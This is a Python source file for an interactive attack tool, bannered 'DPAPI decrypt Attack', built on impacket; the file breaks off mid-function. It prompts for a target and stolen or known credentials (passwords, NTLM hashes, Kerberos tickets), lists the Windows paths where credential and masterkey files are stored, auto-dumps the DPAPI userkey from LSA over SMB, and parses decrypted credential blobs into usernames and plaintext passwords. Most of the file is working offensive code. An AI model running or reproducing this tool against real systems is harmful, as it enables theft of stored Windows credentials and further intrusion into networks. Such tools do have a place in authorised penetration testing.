#!/usr/bin/env python3


from __future__ import print_function
import os
import sys
import logging
import ntpath
import traceback as tb
import struct
import re
import signal
import socket
import errno
import time
import hashlib
import functools

from binascii import unhexlify, hexlify, Error as BinasciiError
from getpass import getpass
from io import BytesIO, StringIO

# =============================================================================
#  Dependency check
# =============================================================================

MISSING = []
try:
    from impacket import crypto, version
    from impacket.uuid import bin_to_string
    from impacket.smbconnection import SMBConnection, SessionError
    from impacket.dcerpc.v5 import transport, lsad, bkrp
    from impacket.dcerpc.v5.rpcrt import (
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
        RPC_C_AUTHN_GSS_NEGOTIATE,
    )
    from impacket.examples.utils import parse_target
    from impacket.structure import hexdump
    from impacket.dpapi import (
        MasterKeyFile, MasterKey, CredHist, DomainKey,
        CredentialFile, DPAPI_BLOB, CREDENTIAL_BLOB,
        VAULT_VCRD, VAULT_VPOL, VAULT_KNOWN_SCHEMAS, VAULT_VPOL_KEYS,
        P_BACKUP_KEY, PREFERRED_BACKUP_KEY, PVK_FILE_HDR,
        PRIVATE_KEY_BLOB, privatekeyblob_to_pkcs1,
        DPAPI_DOMAIN_RSA_MASTER_KEY, deriveKeysFromUser,
        deriveKeysFromUserkey, CREDHIST_FILE,
    )
    from impacket.examples.regsecrets import RemoteOperations
    from impacket.examples.regsecrets import LSASecrets as RemoteLSASecrets
except ImportError as _e:
    MISSING.append(("impacket", str(_e)))

try:
    from Cryptodome.Cipher import AES, PKCS1_v1_5
    from Cryptodome.Util.number import long_to_bytes
except ImportError as _e:
    MISSING.append(("pycryptodome", str(_e)))

try:
    from six import b as six_b
except ImportError as _e:
    MISSING.append(("six", str(_e)))

if MISSING:
    print("\n[FATAL] Missing required libraries:")
    for lib, err in MISSING:
        print(f"  - {lib}: {err}")
    print("\nInstall with:  pip install impacket pycryptodome six\n")
    sys.exit(1)


# =============================================================================
#  Custom Exception Hierarchy
# =============================================================================

class DPAPIError(Exception):
    pass

class ConnectionError(DPAPIError):
    pass

class AuthenticationError(DPAPIError):
    pass

class DecryptionError(DPAPIError):
    pass

class CollectionError(DPAPIError):
    pass

class ValidationError(DPAPIError):
    pass

class ParseError(DPAPIError):
    pass

class ResourceError(DPAPIError):
    pass


# =============================================================================
#  Decorators
# =============================================================================

def retry_on_error(max_retries=3, delay=1.0,
                   exceptions=(Exception,), backoff=2.0):
    def decorator(func):
        @functools.wraps(func)
        def wrapper(*args, **kwargs):
            current_delay = delay
            last_exception = None
            for attempt in range(max_retries):
                try:
                    return func(*args, **kwargs)
                except exceptions as exc:
                    last_exception = exc
                    if attempt < max_retries - 1:
                        logging.debug(
                            "Retry %d/%d for %s: %s",
                            attempt + 1, max_retries, func.__name__, exc
                        )
                        time.sleep(current_delay)
                        current_delay *= backoff
                    else:
                        raise last_exception
            return None
        return wrapper
    return decorator


def safe_operation(default_return=None, log_level=logging.DEBUG):
    def decorator(func):
        @functools.wraps(func)
        def wrapper(*args, **kwargs):
            try:
                return func(*args, **kwargs)
            except Exception as exc:
                logging.log(log_level, "Safe operation failed in %s: %s",
                            func.__name__, exc)
                if DEBUG_MODE:
                    tb.print_exc()
                return default_return
        return wrapper
    return decorator


# =============================================================================
#  Global state
# =============================================================================

DEBUG_MODE   = False
_INTERRUPTED = False
_CLEANUP     = []


def _sigint_handler(sig, frame):
    global _INTERRUPTED
    _INTERRUPTED = True
    print("\n\n  [!] Ctrl+C detected. Cleaning up and exiting...\n")
    cleanup_all()
    sys.exit(0)


def cleanup_all():
    for obj in _CLEANUP:
        try:
            if hasattr(obj, "finish"):
                obj.finish()
            elif hasattr(obj, "disconnect"):
                obj.disconnect()
            elif hasattr(obj, "logoff"):
                obj.logoff()
            elif hasattr(obj, "close"):
                obj.close()
            elif callable(obj):
                obj()
        except Exception as exc:
            logging.debug("Cleanup error: %s", exc)


signal.signal(signal.SIGINT, _sigint_handler)


def _check_interrupt():
    if _INTERRUPTED:
        sys.exit(0)


# =============================================================================
#  Constants / paths
# =============================================================================

SYSTEM_CRED_PATHS = [
    r"\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials",
    r"\Windows\System32\config\systemprofile\AppData\Roaming\Microsoft\Credentials",
    r"\Windows\ServiceProfiles\LocalService\AppData\Local\Microsoft\Credentials",
    r"\Windows\ServiceProfiles\LocalService\AppData\Roaming\Microsoft\Credentials",
    r"\Windows\ServiceProfiles\NetworkService\AppData\Local\Microsoft\Credentials",
    r"\Windows\ServiceProfiles\NetworkService\AppData\Roaming\Microsoft\Credentials",
]

SYSTEM_MK_PATHS = [
    r"\Windows\System32\Microsoft\Protect\S-1-5-18\User",
    r"\Windows\System32\Microsoft\Protect\S-1-5-18",
]

USER_PROFILE_BASE  = r"\Users"
USER_CRED_RELATIVE = [
    r"AppData\Roaming\Microsoft\Credentials",
    r"AppData\Local\Microsoft\Credentials",
]
USER_MK_RELATIVE = [
    r"AppData\Roaming\Microsoft\Protect",
]

SKIP_NAMES = {
    "DFBE70A7E5CC19A398EBF1B96859CE5D",
    "desktop.ini", "Preferred", "preferred", "PREFERRED", "Diagnostic",
}

SILENT_SMB_CODES = {0xC0000034, 0xC000003A, 0xC0000035}

MAX_FILE_SIZE      = 50 * 1024 * 1024
MAX_CREDENTIALS    = 10000
MAX_MASTERKEYS     = 5000
MAX_INPUT_ATTEMPTS = 100

# ---------------------------------------------------------------------------
#  Compiled regular expressions
# ---------------------------------------------------------------------------

MK_GUID_RE = re.compile(
    r"^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$",
    re.IGNORECASE,
)

# Strict IPv4 — four octets, each 0-255
IPV4_RE = re.compile(
    r"^((25[0-5]|2[0-4]\d|1\d{2}|[1-9]\d|\d)\.){3}"
    r"(25[0-5]|2[0-4]\d|1\d{2}|[1-9]\d|\d)$"
)

# Hostname — RFC-1123, must contain at least one dot to be a valid FQDN
# Single-label names (e.g. "mvc", "asd") are accepted ONLY for target host,
# not for DC IP (which requires a real IPv4 address).
FQDN_RE = re.compile(
    r"^(?!-)([A-Za-z0-9\-]{1,63}\.)+[A-Za-z]{2,63}$"
)

# Single-label NetBIOS-style name (letters, digits, hyphens, 1-15 chars)
NETBIOS_RE = re.compile(r"^[A-Za-z0-9\-]{1,15}$")

# Domain name — must contain a dot (e.g. domain.com, corp.internal, WORKGROUP.local)
# OR be a plain NetBIOS workgroup name (letters/digits/hyphens, 1-15 chars)
DOMAIN_RE = re.compile(
    r"^(?:[A-Za-z0-9\-]{1,15}|"                         # NetBIOS workgroup
    r"(?!-)([A-Za-z0-9\-]{1,63}\.)+[A-Za-z]{2,63})$"   # FQDN
)

HEX_RE    = re.compile(r"^[0-9a-fA-F]+$")
SID_RE    = re.compile(r"^S-1-\d+(\-\d+)+$")
NTHASH_RE = re.compile(r"^[0-9a-fA-F]{32}$")
LMHASH_RE = re.compile(r"^[0-9a-fA-F]{32}$")


# ---------------------------------------------------------------------------
#  Low-level validation helpers
# ---------------------------------------------------------------------------

def is_valid_mk_name(name):
    if not name or not isinstance(name, str):
        return False
    return bool(MK_GUID_RE.match(name.strip()))


def is_valid_ipv4(v):
    """True only for a dotted-decimal IPv4 address."""
    if not v or not isinstance(v, str):
        return False
    return bool(IPV4_RE.match(v.strip()))


def is_valid_target_host(v):
    """
    Accept any of:
      - Valid IPv4  (192.168.x.x)
      - FQDN        (dc01.corp.local)
      - NetBIOS     (WIN-DC01, MVC)   — short machine names used on internal nets
    """
    if not v or not isinstance(v, str):
        return False
    v = v.strip()
    if is_valid_ipv4(v):
        return True
    if FQDN_RE.match(v):
        return True
    if NETBIOS_RE.match(v):
        return True
    return False


def is_valid_username(v):
    if not v or not isinstance(v, str):
        return False
    v = v.strip()
    if not v or len(v) > 104:
        return False
    if all(c in " ." for c in v):
        return False
    forbidden = set('"[]:|<>+=;,?*')
    if any(c in forbidden for c in v):
        return False
    return True


def _is_silent_smb_error(exc):
    if exc is None:
        return False
    msg = str(exc)
    for code in SILENT_SMB_CODES:
        if hex(code).lower() in msg.lower():
            return True
    return any(t in msg for t in [
        "STATUS_OBJECT_NAME_NOT_FOUND",
        "STATUS_OBJECT_PATH_NOT_FOUND",
    ])


def safe_unhexlify(hex_str):
    try:
        if not hex_str:
            return None
        clean = hex_str.strip().lower().lstrip("0x")
        if not clean:
            return None
        if len(clean) % 2 != 0:
            logging.warning("Hex string has odd length: %d", len(clean))
            return None
        if not HEX_RE.match(clean):
            logging.warning("Hex string contains non-hex characters")
            return None
        return unhexlify(clean)
    except BinasciiError as exc:
        logging.warning("Invalid hex data: %s", exc)
        return None
    except Exception as exc:
        logging.warning("Unexpected error in hex conversion: %s", exc)
        return None


# =============================================================================
#  Logging
# =============================================================================

class _NoisyFilter(logging.Filter):
    _SUPPRESS = [
        "STATUS_OBJECT_NAME_NOT_FOUND",
        "STATUS_OBJECT_PATH_NOT_FOUND",
        "Retrieving class info",
        "Enumerating keys",
        "Decrypting LSA Key",
        "Retrieving SECURITY",
        "PolEKList",
        "getMachineKerberosSalt",
    ]

    def filter(self, record):
        try:
            if record.levelno >= logging.ERROR:
                return True
            msg = record.getMessage()
            if DEBUG_MODE:
                return not any(p in msg for p in self._SUPPRESS)
            if record.name.startswith("impacket"):
                return record.levelno >= logging.WARNING
            return True
        except Exception:
            return True


def setup_logging(debug):
    global DEBUG_MODE
    DEBUG_MODE = debug
    try:
        h = logging.StreamHandler()
        h.setFormatter(logging.Formatter(
            "%(asctime)s  %(levelname)-8s  %(message)s",
            datefmt="%H:%M:%S",
        ))
        h.addFilter(_NoisyFilter())
        logging.root.handlers = []
        logging.root.addHandler(h)
        logging.root.setLevel(logging.DEBUG if debug else logging.INFO)
    except Exception as exc:
        print("Warning: Could not setup logging: %s" % exc)


# =============================================================================
#  Output helpers
# =============================================================================

BANNER = r"""
+===============================================================+
|                                                               |
|                   DPAPI decrypt Attack                        |
|                                                               |
+===============================================================+
"""
LINE = "-" * 65


def section(t):
    try:
        print("\n%s\n  %s\n%s" % (LINE, t, LINE))
    except Exception:
        print("\n  %s" % t)


def ok(m):
    try:
        print("  [+] %s" % m)
    except Exception:
        pass


def info(m):
    try:
        print("  [*] %s" % m)
    except Exception:
        pass


def warn(m):
    try:
        print("  [!] %s" % m)
    except Exception:
        pass


def fail(m):
    try:
        print("  [-] %s" % m)
    except Exception:
        pass


_ERROR_MAP = {
    "Name or service not known":        "Cannot resolve hostname.",
    "Connection refused":               "Port 445 refused. Is SMB enabled?",
    "timed out":                        "Connection timed out.",
    "STATUS_LOGON_FAILURE":             "Wrong username or password.",
    "STATUS_ACCESS_DENIED":             "Access denied. Check LocalAccountTokenFilterPolicy.",
    "STATUS_ACCOUNT_DISABLED":          "Account is disabled.",
    "STATUS_PASSWORD_EXPIRED":          "Password has expired.",
    "STATUS_ACCOUNT_LOCKED_OUT":        "Account is locked out.",
    "STATUS_NETWORK_NAME_DELETED":      "SMB session dropped. Try again.",
    "ERROR_DEPENDENT_SERVICES_RUNNING": "Service has dependents (non-fatal).",
    "KRB5":                             "Kerberos error. Check ccache and DC IP.",
    "clock skew":                       "Kerberos clock skew. Sync time with DC.",
    "STATUS_OBJECT_NAME_NOT_FOUND":     "File or path not found.",
    "STATUS_OBJECT_PATH_NOT_FOUND":     "Path not found.",
    "STATUS_NO_SUCH_FILE":              "File not found.",
    "STATUS_INVALID_PARAMETER":         "Invalid parameter in request.",
    "STATUS_INSUFFICIENT_RESOURCES":    "Server resources exhausted.",
    "STATUS_TOO_MANY_OPENED_FILES":     "Too many open files on server.",
    "STATUS_DISK_FULL":                 "Disk is full on target.",
    "STATUS_MEDIA_WRITE_PROTECTED":     "Media is write protected.",
    "STATUS_DEVICE_NOT_READY":          "Device not ready.",
    "STATUS_SHARING_VIOLATION":         "File is locked by another process.",
    "STATUS_LOCK_CONFLICT":             "Lock conflict on file.",
    "STATUS_FILE_IS_A_DIRECTORY":       "Expected file, got directory.",
    "STATUS_NOT_A_DIRECTORY":           "Expected directory, got file.",
    "STATUS_USER_SESSION_DELETED":      "SMB session already closed.",
}


def _friendly(exc):
    if exc is None:
        return "Unknown error"
    msg = str(exc)
    if not msg:
        return "%s: (no message)" % type(exc).__name__
    for p, f in _ERROR_MAP.items():
        if p.lower() in msg.lower():
            return f
    return msg[:150] + ("..." if len(msg) > 150 else "")


def handle_error(ctx, exc, fatal=False):
    try:
        fail("%s: %s" % (ctx, _friendly(exc)))
        if DEBUG_MODE:
            print()
            tb.print_exc()
            print()
        if fatal:
            print("\n  Cannot continue. Exiting.\n")
            sys.exit(1)
    except SystemExit:
        raise
    except Exception as handler_exc:
        print("Error in error handler: %s" % handler_exc)
        if fatal:
            sys.exit(1)


# =============================================================================
#  Low-level input primitive
# =============================================================================

def _raw_input(prompt_text, secret=False):
    """
    Read one line.  KeyboardInterrupt exits cleanly; EOFError returns "".
    The prompt is printed with two leading spaces for visual alignment.
    """
    _check_interrupt()
    try:
        if secret:
            return getpass("  %s: " % prompt_text)
        return input("  %s: " % prompt_text).strip()
    except KeyboardInterrupt:
        print("\n\n  [!] Interrupted. Exiting.")
        sys.exit(0)
    except EOFError:
        return ""
    except Exception as exc:
        logging.debug("Input error: %s", exc)
        return ""


# =============================================================================
#  Field-level validators  —  each returns (bool, error_message_string)
#
#  Rules:
#    - The error message must NOT be indented; callers print it via warn().
#    - Multi-line messages use \n to separate lines; callers split and print.
#    - Optional fields that accept blank input return (True, "") for blank.
# =============================================================================

def _val_target(v):
    """
    Target host — required.
    Accepts: IPv4, FQDN (dot-separated), NetBIOS name (1-15 alnum/hyphen).
    Rejects: obviously invalid strings like '192.168.1olbdf', ',.'.
    """
    try:
        v = v.strip() if v else ""
        if not v:
            return False, "Target cannot be empty."
        if is_valid_ipv4(v):
            return True, ""
        if FQDN_RE.match(v):
            return True, ""
        if NETBIOS_RE.match(v):
            return True, ""
        return (
            False,
            "'%s' is not a valid target.\n"
            "Accepted formats:\n"
            "  IPv4 address : 192.168.x.x\n"
            "  FQDN         : dc01.corp.local\n"
            "  NetBIOS name : WIN-DC01  (letters, digits, hyphens only, max 15 chars)" % v
        )
    except Exception as exc:
        return False, "Target validation error: %s" % exc


def _val_username(v):
    """
    Windows username — required, 1-104 chars.
    Rejects: empty, only-spaces/dots, forbidden shell characters.
    """
    try:
        v = v.strip() if v else ""
        if not v:
            return False, "Username cannot be empty."
        if len(v) > 104:
            return False, "Username is too long (%d chars, maximum is 104)." % len(v)
        if all(c in " ." for c in v):
            return False, "Username cannot consist only of spaces or dots."
        forbidden = set('"[]:|<>+=;,?*')
        bad = [c for c in v if c in forbidden]
        if bad:
            bad_str = " ".join(repr(c) for c in sorted(set(bad)))
            return (
                False,
                "Username contains forbidden characters: %s\n"
                "Remove those characters and try again." % bad_str
            )
        return True, ""
    except Exception as exc:
        return False, "Username validation error: %s" % exc


def _val_domain(v):
    """
    Domain — optional.
    Blank is silently accepted (local account).
    Non-blank must be a NetBIOS workgroup name OR a dotted FQDN.
    Single-label names without a dot (e.g. 'adfd', 'CORP') are REJECTED
    unless they match the NetBIOS pattern (≤15 chars, letters/digits/hyphens).
    Random strings with numbers mixed in letters (e.g. 'adfd3') are accepted
    as NetBIOS names — that is intentional for workgroup names like 'CS1'.
    """
    try:
        if not v:
            return True, ""
        v = v.strip() if isinstance(v, str) else ""
        if not v:
            return True, ""
        if not DOMAIN_RE.match(v):
            return (
                False,
                "'%s' is not a valid domain name.\n"
                "Accepted formats:\n"
                "  FQDN workgroup  : domain.com   corp.internal   ad.company.com\n"
                "  NetBIOS name    : WORKGROUP   CS   CORP   (max 15 chars)\n"
                "Leave blank for a local account." % v
            )
        return True, ""
    except Exception as exc:
        return False, "Domain validation error: %s" % exc


def _val_dc_ip(v):
    """
    DC IP — optional, but when provided MUST be a valid IPv4 address.
    Hostnames are NOT accepted here because DC IP is used for Kerberos KDC
    lookup where an IP is required.
    """
    try:
        if not v or not v.strip():
            return True, ""
        v = v.strip()
        if is_valid_ipv4(v):
            return True, ""
        return (
            False,
            "'%s' is not a valid IPv4 address.\n"
            "DC IP must be a dotted-decimal address, e.g. 192.168.x.x\n"
            "Leave blank if you do not need Kerberos / DC lookup." % v
        )
    except Exception as exc:
        return False, "DC IP validation error: %s" % exc


def _val_lmhash(v):
    """LM hash — exactly 32 hex characters."""
    try:
        v = v.strip() if v else ""
        if not v:
            return (
                False,
                "LM hash cannot be empty.\n"
                "Use 32 zeros if the LM hash is not set: " + "0" * 32
            )
        if not LMHASH_RE.match(v):
            return (
                False,
                "LM hash must be exactly 32 hex characters (got %d).\n"
                "Use 00000000000000000000000000000000 if the LM hash is empty." % len(v)
            )
        return True, ""
    except Exception as exc:
        return False, "LM hash validation error: %s" % exc


def _val_nthash(v):
    """NT hash — exactly 32 hex characters."""
    try:
        v = v.strip() if v else ""
        if not v:
            return False, "NT hash cannot be empty."
        if not NTHASH_RE.match(v):
            return (
                False,
                "NT hash must be exactly 32 hex characters (got %d).\n"
                "Example: 8846f7eaee8fb117ad06bdd830b7586c" % len(v)
            )
        return True, ""
    except Exception as exc:
        return False, "NT hash validation error: %s" % exc


def _val_aes_key(v):
    """AES key — optional. Non-blank must be 32 or 64 hex chars."""
    try:
        if not v or not v.strip():
            return True, ""
        clean = v.strip().lower()
        if clean.startswith("0x"):
            clean = clean[2:]
        if not clean:
            return False, "AES key is empty after stripping the '0x' prefix."
        if not HEX_RE.match(clean):
            return (
                False,
                "AES key must contain only hex characters (0-9, a-f).\n"
                "Got: '%s'" % v.strip()
            )
        if len(clean) not in (32, 64):
            return (
                False,
                "AES key must be exactly 32 hex chars (128-bit) or 64 hex chars (256-bit).\n"
                "Got %d hex characters." % len(clean)
            )
        return True, ""
    except Exception as exc:
        return False, "AES key validation error: %s" % exc


def _val_dpapi_key(v):
    """
    Supplied DPAPI userkey — optional.
    Non-blank: hex only, even length, minimum 16 hex chars (8 bytes).
    """
    try:
        if not v or not v.strip():
            return True, ""
        if not isinstance(v, str):
            return False, "Key must be a string."
        clean = v.strip().lower()
        if clean.startswith("0x"):
            clean = clean[2:]
        if not clean:
            return False, "Key is empty after stripping the '0x' prefix."
        if not HEX_RE.match(clean):
            return (
                False,
                "Key must contain only hex characters (0-9, a-f).\n"
                "Got: '%s'\n"
                "Tip: leave blank to let the tool dump the key automatically from LSA." % v.strip()
            )
        if len(clean) < 16:
            return (
                False,
                "Key is only %d hex chars — DPAPI userkeys are typically 40 hex chars (20 bytes).\n"
                "Double-check the key you copied." % len(clean)
            )
        if len(clean) % 2 != 0:
            return (
                False,
                "Key has an odd number of hex characters (%d).\n"
                "Each byte is two hex chars, so the total must be even." % len(clean)
            )
        return True, ""
    except Exception as exc:
        return False, "DPAPI key validation error: %s" % exc


def _val_nt_hash_for_mk(v):
    """NT hash for masterkey decryption — exactly 32 hex chars, no prefix."""
    try:
        v = v.strip() if v else ""
        if not v:
            return False, "NT hash cannot be empty."
        if not HEX_RE.match(v):
            return (
                False,
                "NT hash must contain only hex characters (0-9, a-f).\n"
                "Got: '%s'" % v
            )
        if len(v) != 32:
            return (
                False,
                "NT hash must be exactly 32 hex characters (got %d).\n"
                "Example: 8846f7eaee8fb117ad06bdd830b7586c" % len(v)
            )
        return True, ""
    except Exception as exc:
        return False, "NT hash validation error: %s" % exc


# =============================================================================
#  High-level input helpers  —  all loop until valid input is received
# =============================================================================

def _print_validation_error(msg):
    """
    Print a (possibly multi-line) validation error message.
    Each line is printed via warn() so it gets the [!] prefix.
    No extra indentation is added — warn() already indents with two spaces.
    """
    if not msg:
        warn("Invalid input — please try again.")
        return
    lines = str(msg).strip().splitlines()
    for line in lines:
        warn(line.strip())


def _ask_field(prompt_text, validator, secret=False):
    """
    Required validated field.
    Loops until the validator returns (True, "").
    Blank input is rejected with a clear message.
    """
    while True:
        _check_interrupt()
        try:
            raw = _raw_input(prompt_text, secret=secret)
        except (KeyboardInterrupt, SystemExit):
            raise
        except Exception as exc:
            warn("Input error: %s — please try again." % exc)
            continue

        if not raw:
            warn("This field cannot be empty — please enter a value.")
            continue

        try:
            result = validator(raw)
        except Exception as exc:
            warn("Validation error: %s — please try again." % exc)
            continue

        valid, msg = (result if isinstance(result, tuple) else (bool(result), ""))

        if valid:
            return raw.strip()

        _print_validation_error(msg)


def _ask_optional_field(prompt_text, validator, blank_label="(blank = not set)"):
    """
    Optional validated field.
    Blank input is always accepted without calling the validator.
    Non-blank input is validated and re-prompted on failure.
    """
    full_prompt = "%s  %s" % (prompt_text, blank_label)
    while True:
        _check_interrupt()
        try:
            raw = _raw_input(full_prompt)
        except (KeyboardInterrupt, SystemExit):
            raise
        except Exception as exc:
            warn("Input error: %s — please try again." % exc)
            continue

        if not raw:
            return ""

        try:
            result = validator(raw)
        except Exception as exc:
            warn("Validation error: %s — please try again." % exc)
            continue

        valid, msg = (result if isinstance(result, tuple) else (bool(result), ""))

        if valid:
            return raw.strip()

        _print_validation_error(msg)


def _ask_yn(prompt_text, default=False):
    """
    Yes/No prompt.  Re-prompts on anything other than y/yes/n/no/blank.
    """
    hint = "[Y/n]" if default else "[y/N]"
    while True:
        _check_interrupt()
        try:
            raw = _raw_input("%s %s" % (prompt_text, hint)).lower()
        except (KeyboardInterrupt, SystemExit):
            raise
        except Exception as exc:
            warn("Input error: %s — please try again." % exc)
            continue

        if raw == "":
            return default
        if raw in ("y", "yes"):
            return True
        if raw in ("n", "no"):
            return False

        warn("Please type  y  or  n.")


def _ask_choice(prompt_text, valid, default=""):
    """
    Multiple-choice prompt.  Re-prompts until a valid option is entered.
    """
    if not valid or not isinstance(valid, (set, list, tuple, frozenset)):
        raise ValidationError("Empty or invalid choices set")

    sorted_opts = sorted(str(v) for v in valid)
    hint = "[%s]" % default if default else "[%s]" % "/".join(sorted_opts)

    while True:
        _check_interrupt()
        try:
            raw = _raw_input("%s %s" % (prompt_text, hint))
        except (KeyboardInterrupt, SystemExit):
            raise
        except Exception as exc:
            warn("Input error: %s — please try again." % exc)
            continue

        if raw == "" and default:
            return default

        if raw in valid:
            return raw

        warn(
            "'%s' is not a valid choice — please enter one of: %s"
            % (raw, ", ".join(sorted_opts))
        )


def _ask_password(prompt_text="Password"):
    """
    Password prompt.
    Empty password is accepted only after the user explicitly confirms.
    """
    while True:
        _check_interrupt()
        try:
            pw = _raw_input(prompt_text, secret=True)
        except (KeyboardInterrupt, SystemExit):
            raise
        except Exception as exc:
            warn("Password input error: %s — please try again." % exc)
            continue

        if not pw:
            warn("Empty password entered.")
            if _ask_yn("Continue with empty password?", default=False):
                return ""
            warn("Please enter the password.")
            continue

        return pw


# =============================================================================
#  Input collection  —  every field validated, every field re-prompts
# =============================================================================

def collect_inputs():
    print(BANNER)
   
    

    try:
        # -----------------------------------------------------------------
        #  Connection
        # -----------------------------------------------------------------
        print("  +-- Connection ----------------------------------------------+")

        target = _ask_field(
            "Target IP or hostname",
            validator=_val_target,
        )

        username = _ask_field(
            "Username",
            validator=_val_username,
        )

        # Domain — optional; blank = local account
        domain = _ask_optional_field(
            "Domain",
            validator=_val_domain,
            blank_label="(blank = local account)",
        )

        # DC IP — optional; must be IPv4 when provided
        dc_raw = _ask_optional_field(
            "DC IP",
            validator=_val_dc_ip,
            blank_label="(blank = not needed, IPv4 only)",
        )
        dc_ip = dc_raw.strip() or None

        print("  +------------------------------------------------------------+")

        # -----------------------------------------------------------------
        #  Authentication method
        # -----------------------------------------------------------------
        print("\n  +-- Authentication ------------------------------------------+")
        print("  |  1. Password          (default)                            |")
        print("  |  2. NTLM hashes       (LMHASH:NTHASH)                      |")
        print("  |  3. Kerberos ccache   (requires valid KRB5CCNAME env var)  |")
        print("  +------------------------------------------------------------+")

        auth = _ask_choice("Auth method", valid={"1", "2", "3"}, default="1")

        password = lmhash = nthash = aes_key = ""
        use_kerberos = False

        if auth == "1":
            password = _ask_password("Password")

        elif auth == "2":
            print("\n  Enter hashes separately for precise validation.")
            lmhash = _ask_field(
                "LM hash (32 hex chars, or 32 zeros if blank)",
                validator=_val_lmhash,
            )
            nthash = _ask_field(
                "NT hash (32 hex chars)",
                validator=_val_nthash,
            )

        elif auth == "3":
            use_kerberos = True
            aes_key = _ask_optional_field(
                "AES key",
                validator=_val_aes_key,
                blank_label="(blank = use ccache only)",
            )

        # -----------------------------------------------------------------
        #  Scope
        # -----------------------------------------------------------------
        print("\n  +-- Scope ---------------------------------------------------+")
        print("  |  1. SYSTEM credentials only  (fastest)                    |")
        print("  |  2. All user credentials     (requires user password)     |")
        print("  |  3. Both SYSTEM + all users  (complete — default)         |")
        print("  +------------------------------------------------------------+")

        scope = _ask_choice("Scope", valid={"1", "2", "3"}, default="3")

        debug = _ask_yn("Enable debug output?", default=False)

        # -----------------------------------------------------------------
        #  Optional DPAPI userkey
        # -----------------------------------------------------------------
        print("\n  +-- DPAPI Userkey -------------------------------------------+")
        print("  |  Leave blank to auto-dump from LSA (recommended)          |")
        print("  |  Supply only if you already have it from a previous run   |")
        print("  +------------------------------------------------------------+")

        supplied_key = _ask_optional_field(
            "dpapi_userkey (0x... or blank)",
            validator=_val_dpapi_key,
            blank_label="(blank = auto LSA dump)",
        )

        # -----------------------------------------------------------------
        #  Review & confirm
        # -----------------------------------------------------------------
        scope_label = {"1": "SYSTEM only", "2": "Users only",
                       "3": "SYSTEM + All Users"}[scope]
        auth_label  = {"1": "Password", "2": "NTLM Hashes",
                       "3": "Kerberos"}[auth]
        user_str    = ("%s\\%s" % (domain, username)) if domain else username
        key_label   = (
            "yes (0x%s...)" % supplied_key.lstrip("0xX")[:8]
            if supplied_key else "no (auto LSA dump)"
        )

        print("""
  +===========================================================+
  |                  Attack Configuration                     |
  +===========================================================+
  |  Target       : %-42s|
  |  User         : %-42s|
  |  Auth         : %-42s|
  |  DC IP        : %-42s|
  |  Scope        : %-42s|
  |  Debug        : %-42s|
  |  Supplied key : %-42s|
  +===========================================================+""" % (
            target, user_str, auth_label, dc_ip or "not set",
            scope_label, str(debug), key_label,
        ))

        if not _ask_yn("\nProceed with attack?", default=True):
            print("\n  Aborted by user.\n")
            sys.exit(0)

        return {
            "target_ip":    target,
            "username":     username,
            "domain":       domain,
            "password":     password,
            "lmhash":       lmhash,
            "nthash":       nthash,
            "use_kerberos": use_kerberos,
            "aes_key":      aes_key,
            "dc_ip":        dc_ip,
            "scope":        scope,
            "do_system":    scope in ("1", "3"),
            "do_users":     scope in ("2", "3"),
            "debug":        debug,
            "supplied_key": supplied_key,
        }

    except (KeyboardInterrupt, EOFError):
        raise
    except SystemExit:
        raise
    except Exception as exc:
        handle_error("Input collection failed", exc, fatal=True)
        return {}


# =============================================================================
#  CREDENTIAL_BLOB parser
# =============================================================================

def parse_decrypted_credential(data):
    result = {"target": "", "username": "", "password": "",
              "comment": "", "last_written": ""}
    if not data or not isinstance(data, (bytes, bytearray)):
        return result
    if len(data) > MAX_FILE_SIZE:
        logging.warning("Credential data too large (%d bytes), truncating", len(data))
        data = data[:MAX_FILE_SIZE]

    old_stdout = sys.stdout
    try:
        try:
            cb = CREDENTIAL_BLOB(data)
        except Exception as exc:
            logging.debug("Cred parse layer 1 init: %s", exc)
            cb = None

        if cb is not None:
            try:
                sys.stdout = captured = StringIO()
                try:
                    cb.dump()
                finally:
                    sys.stdout = old_stdout
                dump_text = captured.getvalue()
                print(dump_text, end="")
                parsed = _parse_dump_text(dump_text)
                if any(parsed.values()):
                    result.update(parsed)
                    return result
            except Exception as exc:
                sys.stdout = old_stdout
                logging.debug("Cred parse layer 1 dump: %s", exc)
    except Exception as exc:
        sys.stdout = old_stdout
        logging.debug("Cred parse layer 1: %s", exc)

    try:
        cb = CREDENTIAL_BLOB(data)
        parsed = _direct_fields(cb)
        if any(parsed.values()):
            result.update(parsed)
            return result
    except Exception as exc:
        logging.debug("Cred parse layer 2: %s", exc)

    try:
        result.update(_utf16_scan(data))
    except Exception as exc:
        logging.debug("Cred parse layer 3: %s", exc)

    return result


def _parse_dump_text(text):
    r = {"target": "", "username": "", "password": "",
         "comment": "", "last_written": ""}
    if not text or not isinstance(text, str):
        return r
    unknown = 0
    try:
        for line in text.splitlines():
            line = line.strip() if line else ""
            if not line or ":" not in line:
                continue
            try:
                key, _, val = line.partition(":")
                key, val = key.strip(), val.strip()
                if   key == "Target":      r["target"]      = val
                elif key == "Username":    r["username"]     = val
                elif key == "LastWritten": r["last_written"] = val
                elif key == "Description" and val:
                    r["comment"] = val
                elif key == "Unknown":
                    unknown += 1
                    if unknown == 2 and val:
                        r["password"] = val
                    elif unknown == 1 and val and not r["comment"]:
                        r["comment"] = val
            except Exception as exc:
                logging.debug("Dump text parse line: %s", exc)
                continue
    except Exception as exc:
        logging.debug("Dump text parse: %s", exc)
    return r


def _direct_fields(cb):
    r = {"target": "", "username": "", "password": "", "comment": ""}
    if cb is None:
        return r

    def decode(raw):
        if raw is None:
            return ""
        if isinstance(raw, (bytes, bytearray)):
            for enc in ("utf-16-le", "utf-8", "latin-1"):
                try:
                    return raw.decode(enc).rstrip("\x00").strip()
                except (UnicodeDecodeError, AttributeError):
                    continue
            try:
                return raw.hex()
            except Exception:
                return str(raw)
        return str(raw).rstrip("\x00").strip()

    try:
        for key, names in [
            ("target",   ["TargetName", "Target",      "target"]),
            ("username", ["UserName",   "Username",    "username"]),
            ("password", ["CredentialBlob", "Password","password", "Blob"]),
            ("comment",  ["Comment",    "Description", "comment"]),
        ]:
            for name in names:
                try:
                    val = decode(cb[name])
                    if val:
                        r[key] = val
                        break
                except (KeyError, TypeError, AttributeError):
                    continue
                except Exception as exc:
                    logging.debug("Direct field decode: %s", exc)
                    continue
    except Exception as exc:
        logging.debug("Direct fields: %s", exc)
    return r


def _utf16_scan(data):
